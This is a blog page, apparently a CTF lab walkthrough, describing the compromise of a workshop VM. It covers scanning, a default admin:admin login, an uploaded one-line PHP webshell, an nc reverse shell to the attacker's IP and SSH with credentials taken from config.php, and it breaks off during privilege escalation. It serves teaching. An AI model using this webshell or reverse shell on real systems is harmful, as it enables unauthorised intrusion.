@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <title>Monkey Machine Walkthrough (WriteUp) :: Drayko Escobar Blog - Passion for cybersecurity</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="On Sunday, April 5th, there was an event for International Women&rsquo;s Day. Among other activities, there was a cybersecurity workshop. And well, I kinda sneaked in 😜. The workshop had some requirements like having Kali Linux installed. Luckily, I had my laptop and my phone (yep, Kali on both—double the fun 💁‍♂️). I was ready! But then I found out we needed a virtual machine too, which a friend later shared with me. So I had to step out of the workshop.
+"
+/>
+<meta
+  name="keywords"
+  content="InfoSec Specialist, Web Security, Pentesting, Bug Bounty, CTF,CTF write-ups, GitHub for security tools, cybersecurity, pentest, bugbounty, OWASP, Drayko Escobar cybersecurity, Information Security Specialist, Web Security Testing expert, Penetration Tester, Bug Bounty hunter, Ransomware analysis, Python, speaker, Capture The Flag, Ethical hacking, Linux security"
+/>
+<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" />
+    <meta property="og:image" content="https://drayko.github.io/post/monkey-hm-writeup//images/bot.jpg">
+    <meta name="twitter:image" content="https://drayko.github.io/post/monkey-hm-writeup//images/bot.jpg">
+
+
+<meta property="og:url" content="https://drayko.github.io/post/monkey-hm-writeup/">
+  <meta property="og:site_name" content="Drayko Escobar Blog">
+  <meta property="og:title" content="Monkey Machine Walkthrough (WriteUp)">
+  <meta property="og:description" content="On Sunday, April 5th, there was an event for International Women’s Day. Among other activities, there was a cybersecurity workshop. And well, I kinda sneaked in 😜. The workshop had some requirements like having Kali Linux installed. Luckily, I had my laptop and my phone (yep, Kali on both—double the fun 💁‍♂️). I was ready! But then I found out we needed a virtual machine too, which a friend later shared with me. So I had to step out of the workshop.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-04-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-08T00:00:00+00:00">
+    <meta property="article:tag" content="WriteUp">
+    <meta property="article:tag" content="CTF">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Monkey Machine Walkthrough (WriteUp)">
+  <meta name="twitter:description" content="On Sunday, April 5th, there was an event for International Women’s Day. Among other activities, there was a cybersecurity workshop. And well, I kinda sneaked in 😜. The workshop had some requirements like having Kali Linux installed. Luckily, I had my laptop and my phone (yep, Kali on both—double the fun 💁‍♂️). I was ready! But then I found out we needed a virtual machine too, which a friend later shared with me. So I had to step out of the workshop.">
+
+
+<link rel="canonical" href="https://drayko.github.io/post/monkey-hm-writeup/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.min.b03d2d218fbbf7435f0f24ce5c248d756c4afb8f172e4ffa7d4cf167c7718286.css">
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-BMCGWX0MQ9"></script>
+      <script>
+        var doNotTrack = false;
+        
+        
+        
+        
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-BMCGWX0MQ9');
+        }
+      </script>
+
+
+
+
+  
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"Drayko Escobar"},"dateModified":"2025-04-08T00:00:00Z","datePublished":"2025-04-08T00:00:00Z","description":"On Sunday, April 5th, there was an event for International Women\u0026rsquo;s Day. Among other activities, there was a cybersecurity workshop. And well, I kinda sneaked in 😜. The workshop had some requirements like having Kali Linux installed. Luckily, I had my laptop and my phone (yep, Kali on both—double the fun 💁‍♂️). I was ready! But then I found out we needed a virtual machine too, which a friend later shared with me. So I had to step out of the workshop.\n","image":"/images/bot.jpg","name":"Monkey Machine Walkthrough (WriteUp)","url":"https://drayko.github.io/post/monkey-hm-writeup/"}
+</script>
+
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/drayko_logo_ico.webp" alt="logo">
+    </a>
+  </div>
+  
+  <h1 class="hidden md:flex flex-col justify-center mx-2">
+    <a href="/" class="text-2xl font-semibold text-slate-800 dark:text-slate-200">
+      Drayko Escobar
+    </a>
+  </h1>
+  
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-xs md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/post/" title="Post">Post</a>
+        </li>
+      
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none">
+    <div class="h-full static">
+      <button id="navbar-lang-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+        <span class="sr-only">Open language switcher</span>
+        <i class="w-8 h-8">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c0 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+        </i>
+      </button>
+      <div class="absolute hidden top-16 z-50" id="navbar-lang">
+        <ul class="flex flex-col rounded-xs px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+          <li class="">
+            <span class="block px-3 py-3 cursor-default hover:text-emerald-600">English</span>
+            </li>
+        
+          <li class="">
+            <a class="block px-3 py-3 hover:text-emerald-600"
+              href="/es/post/monkey-hm-writeup/" title="Español">Español</a></li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="relative flex items-center gap-1 px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="absolute z-10 w-15 h-8 rounded-full bg-white dark:bg-gray-700"></div>
+      <i class="h-6 w-6 z-20 ml-1 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:invisible">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+      </i>
+      <i class="h-6 w-6 z-20 mr-1 flex-none rounded-full place-self-center invisible peer-checked:visible">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+      </i>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div id="progress" class="fixed top-0 left-0 w-full h-1 bg-blue-500"></div>
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+    <div>
+      <a href="/post/monkey-hm-writeup/">
+        <figure>
+    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/images/bot.jpg"
+      alt="Monkey Machine Walkthrough (WriteUp)" title="Monkey Machine Walkthrough (WriteUp)"
+      loading="lazy"
+    >
+  </figure>
+      </a>
+    </div>
+    <div class="flex flex-col gap-y-3 p-6">
+      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+        <a href="/post/monkey-hm-writeup/">Monkey Machine Walkthrough (WriteUp)</a>
+      </h1>
+
+      
+      
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+    
+      
+      <li>
+        <a href="/tags/writeup/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">WriteUp</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/ctf/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">CTF</span>
+        </a>
+      </li>
+      
+    
+  </ul>
+
+
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2025-04-08T00:00:00&#43;00:00">
+      2025-04-08
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      4 minutes to read
+    </span>
+  </div>
+</div>
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+    class="icon icon-tabler icons-tabler-outline icon-tabler-user">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M8 7a4 4 0 1 0 8 0a4 4 0 0 0 -8 0" />
+    <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+    </i>
+    <span>Drayko Escobar</span>
+  </div>
+</div>
+
+      
+        
+        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+          <h2>Table of Contents</h2>
+          <aside><nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon-and-enumeration">Recon and Enumeration</a></li>
+    <li><a href="#first-access---weak-credentials">First Access - Weak Credentials</a></li>
+    <li><a href="#second-access---default-passwords">Second Access - Default Passwords</a></li>
+    <li><a href="#command-execution---webshell">Command Execution - Webshell</a></li>
+    <li><a href="#command-execution---reverse-shell">Command Execution - Reverse Shell</a></li>
+    <li><a href="#command-execution---ssh">Command Execution - SSH</a></li>
+    <li><a href="#privilege-escalation---misconfigured-permissions">Privilege Escalation - Misconfigured Permissions</a></li>
+    <li><a href="#conclusions">Conclusions</a></li>
+  </ul>
+</nav></aside>
+        </section>
+        
+      
+
+      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+        <p>On Sunday, April 5th, there was an event for <strong>International Women&rsquo;s Day</strong>. Among other activities, there was a cybersecurity workshop. And well, I kinda sneaked in 😜. The workshop had some requirements like having Kali Linux installed. Luckily, I had my laptop and my phone (yep, Kali on both—double the fun 💁‍♂️). I was ready! But then I found out we needed a virtual machine too, which a friend later shared with me. So I had to step out of the workshop.</p>
+<p>Still, I couldn&rsquo;t just leave it at that—I <em>had</em> to solve the machine they were working on. So, for everyone who missed the workshop (and those who were there too), here&rsquo;s my walkthrough, explained from scratch. Let&rsquo;s dive in!</p>
+<h2 id="recon-and-enumeration">Recon and Enumeration</h2>
+<p>First things first—reconnaissance. Basically, figuring out what machine we’re dealing with. What’s its IP? What services are running? What’s the setup? What am I doing with my life?! Just kidding 😜</p>
+<p>We use Nmap for this. I scanned the virtual machine’s network to find the target’s IP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap 192.168.185.0/24
+</span></span></code></pre></div><p>It showed some results, and our target was at 192.168.185.128.<div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/1_hu_9308bd657244dbab.webp 320w, /post/monkey-hm-writeup/images/1_hu_b9ef7eda9b94ce86.webp 640w, /post/monkey-hm-writeup/images/1_hu_e10fd54f023909b2.webp 960w, /post/monkey-hm-writeup/images/1_hu_c5b1b87d61c4f1f.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/1_hu_d195b65fac24e58e.jpg 320w, /post/monkey-hm-writeup/images/1_hu_7aab78ee0a7f973c.jpg 640w, /post/monkey-hm-writeup/images/1_hu_91142ab378d88c67.jpg 960w, /post/monkey-hm-writeup/images/1_hu_6a0fa9ac709ae3a6.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/1_hu_7aab78ee0a7f973c.jpg" width="1421" height="970" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>Now that we have the IP and know there’s an HTTP service, let&rsquo;s see what’s on the web server. We&rsquo;ll fuzz for directories (basically, sending lots of common paths to see what’s there). I used Gobuster with this wordlist: <a href="https://gitlab.com/kalilinux/packages/seclists/-/blob/kali/master/Discovery/Web-Content/directory-list-2.3-medium.txt" target="_blank" rel="noopener">directory-list-2.3-medium.txt</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -w directory-list-2.3-medium.txt -u http://192.168.185.128/
+</span></span></code></pre></div><p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/2_hu_8c16c863f74e1beb.webp 320w, /post/monkey-hm-writeup/images/2_hu_26fd334c9fa45ada.webp 640w, /post/monkey-hm-writeup/images/2_hu_48856d2a039e22ae.webp 960w, /post/monkey-hm-writeup/images/2_hu_f4284af08d9104bc.webp 1280w, /post/monkey-hm-writeup/images/2_hu_4292a99c72a1ef07.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/2_hu_49aeba86b12b2242.jpg 320w, /post/monkey-hm-writeup/images/2_hu_79ca38cd265da8c8.jpg 640w, /post/monkey-hm-writeup/images/2_hu_5f766ffe70906f72.jpg 960w, /post/monkey-hm-writeup/images/2_hu_8883228a8918ad71.jpg 1280w, /post/monkey-hm-writeup/images/2_hu_302e473a31374fff.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/2_hu_79ca38cd265da8c8.jpg" width="1788" height="703" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>Found some interesting paths. The most curious one was <code>monkey</code> (same as the VM’s filename), so I ran Gobuster again for that route. Can you guess the command?</p>
+<p><code>gobuster dir -w directory-list-2.3-medium.txt -u http://192.168.185.128/monkey</code></p>
+<h2 id="first-access---weak-credentials">First Access - Weak Credentials</h2>
+<p>This gave us more paths. The <code>/monkey/admin</code> one clearly looked like an admin panel. I tried common credentials. How common? Try <code>admin:admin</code> 💁‍♂️</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/3_hu_f24889a15383f26c.webp 320w, /post/monkey-hm-writeup/images/3_hu_5ab983dac99ba677.webp 640w, /post/monkey-hm-writeup/images/3_hu_2fef574104f92f54.webp 960w, /post/monkey-hm-writeup/images/3_hu_54b8a6c797b4adff.webp 1280w, /post/monkey-hm-writeup/images/3_hu_af38acfa9cc31c55.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/3_hu_e38f63a1f8ce6ec0.jpg 320w, /post/monkey-hm-writeup/images/3_hu_1ccea2d1210a03d9.jpg 640w, /post/monkey-hm-writeup/images/3_hu_cbca32c598563347.jpg 960w, /post/monkey-hm-writeup/images/3_hu_afc625ed21439bc0.jpg 1280w, /post/monkey-hm-writeup/images/3_hu_17106b6d228b4d58.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/3_hu_1ccea2d1210a03d9.jpg" width="1760" height="958" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<h2 id="second-access---default-passwords">Second Access - Default Passwords</h2>
+<p>Boom! We’re in as an admin. In the admin panel, there’s a section for managing student accounts. It lets you reset passwords and even shows the new one; which is always the same.</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/4_hu_dfc11f3cc38b4d51.webp 320w, /post/monkey-hm-writeup/images/4_hu_4e3e0f3ab426d439.webp 640w, /post/monkey-hm-writeup/images/4_hu_a5989204ffe5b799.webp 960w, /post/monkey-hm-writeup/images/4_hu_ce42819d6b4f3e1a.webp 1280w, /post/monkey-hm-writeup/images/4_hu_b5fd1e745d2eb409.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/4_hu_6fd5cba41b8e1da7.jpg 320w, /post/monkey-hm-writeup/images/4_hu_7695910ab40b8013.jpg 640w, /post/monkey-hm-writeup/images/4_hu_f3a2898da4f4530c.jpg 960w, /post/monkey-hm-writeup/images/4_hu_53c08551d3b2c539.jpg 1280w, /post/monkey-hm-writeup/images/4_hu_c585c63d9ec73577.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/4_hu_7695910ab40b8013.jpg" width="1602" height="824" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>At this point, I realized this challenge was from HackerMentor, so I won’t share the VM publicly; just in case it&rsquo;s private material.</p>
+<p>Anyway, I used the student credentials to log into <code>/monkey</code>, and that opened a new panel where we can upload a profile picture.</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/5_hu_49cac2e02f2fc148.webp 320w, /post/monkey-hm-writeup/images/5_hu_2eedfeef34c22671.webp 640w, /post/monkey-hm-writeup/images/5_hu_199d654fe315e329.webp 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/5_hu_74f6f5b70b9630ce.jpg 320w, /post/monkey-hm-writeup/images/5_hu_37a9aceea28941f.jpg 640w, /post/monkey-hm-writeup/images/5_hu_58dc11be069916ee.jpg 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/5_hu_37a9aceea28941f.jpg" width="1163" height="966" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<h2 id="command-execution---webshell">Command Execution - Webshell</h2>
+<p>Let’s try uploading something other than a picture, like a PHP file. Why PHP? Because the app runs on PHP, so we can try uploading malicious web code (a webshell) to execute commands on the server.</p>
+<p>I used a simple one-liner PHP shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>What does it do? It executes whatever command we pass using the <code>cmd</code> parameter via the URL. Here&rsquo;s the result:</p>
+<p><div class="not-prose">
+<figure>
+    <img src="images/images/6.png"
+      alt="" 
+      loading="lazy"
+    >
+  </figure></div>
+</p>
+<h2 id="command-execution---reverse-shell">Command Execution - Reverse Shell</h2>
+<p>Now that we can run code, let’s make it easier by setting up a reverse shell (where the server connects back to us). We run this using <code>cmd</code>:</p>
+<pre tabindex="0"><code>http://192.168.185.128/monkey/studentphoto/shell.php?cmd=nc%20192.168.185.1%205555%20-e%20%2Fbin%2Fsh
+</code></pre><p>Meanwhile, we listen on our machine using <code>ncat</code> on port 5555.</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/7_hu_5150016743234076.webp 320w, /post/monkey-hm-writeup/images/7_hu_ac61507f6a447c38.webp 640w, /post/monkey-hm-writeup/images/7_hu_2e64c242cdd17271.webp 960w, /post/monkey-hm-writeup/images/7_hu_d6938515a2df9c88.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/7_hu_6228d8117bde0b56.jpg 320w, /post/monkey-hm-writeup/images/7_hu_9fca143c0a2e21bc.jpg 640w, /post/monkey-hm-writeup/images/7_hu_2eba0631c8bc37db.jpg 960w, /post/monkey-hm-writeup/images/7_hu_1c682cb45118c7b7.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/7_hu_9fca143c0a2e21bc.jpg" width="1374" height="561" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>We now have a shell to execute commands on the target. While exploring, I found something interesting, <code>config.php</code> is located at <code>/var/www/html/monkey/includes</code>.</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/8_hu_554d8a36f75a4eda.webp 320w, /post/monkey-hm-writeup/images/8_hu_37cf64f1d5e23e35.webp 640w, /post/monkey-hm-writeup/images/8_hu_afd20095f61d21fc.webp 960w, /post/monkey-hm-writeup/images/8_hu_b7dff710794bc8dc.webp 1280w, /post/monkey-hm-writeup/images/8_hu_efa9c255208bbcb.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/8_hu_d3e22e6a6ddf5c5b.jpg 320w, /post/monkey-hm-writeup/images/8_hu_cec0953b678c341d.jpg 640w, /post/monkey-hm-writeup/images/8_hu_db9de6db92187553.jpg 960w, /post/monkey-hm-writeup/images/8_hu_108c88615fd1712f.jpg 1280w, /post/monkey-hm-writeup/images/8_hu_6813c99c179b8591.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/8_hu_cec0953b678c341d.jpg" width="1829" height="699" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>It contained credentials! Time to try those on the SSH service we saw earlier with Nmap(the importance of recon and enumeration).</p>
+<h2 id="command-execution---ssh">Command Execution - SSH</h2>
+<p>Using those credentials, I logged in via SSH and got a stable shell. That gave me the first flag, usually a proof of access for a specific user.</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/monkey-hm-writeup/images/9_hu_9e90951db73d1b82.webp 320w, /post/monkey-hm-writeup/images/9_hu_9d30bf31a179cdf4.webp 640w, /post/monkey-hm-writeup/images/9_hu_5dc3f0956bc3ef47.webp 960w, /post/monkey-hm-writeup/images/9_hu_d8cf1ee3e17178eb.webp 1280w, /post/monkey-hm-writeup/images/9_hu_5259b24ede1b44d9.webp 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/monkey-hm-writeup/images/9_hu_dc02d248e682ce8c.jpg 320w, /post/monkey-hm-writeup/images/9_hu_6f0e97354d5f593d.jpg 640w, /post/monkey-hm-writeup/images/9_hu_47ba03080fc4c323.jpg 960w, /post/monkey-hm-writeup/images/9_hu_415a7385357a6ab0.jpg 1280w, /post/monkey-hm-writeup/images/9_hu_30e1666579a03388.jpg 1600w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/monkey-hm-writeup/images/9_hu_6f0e97354d5f593d.jpg" width="1840" height="683" alt="" title="" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>But that’s just user access. We want root! I uploaded <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener">linpeas</a>
+ to the server, ran it, and found a few privilege escalation paths. One stood out: a scheduled task by root that runs <code>backup.sh</code>.</p>
+<p><div class="not-prose">
+<picture>
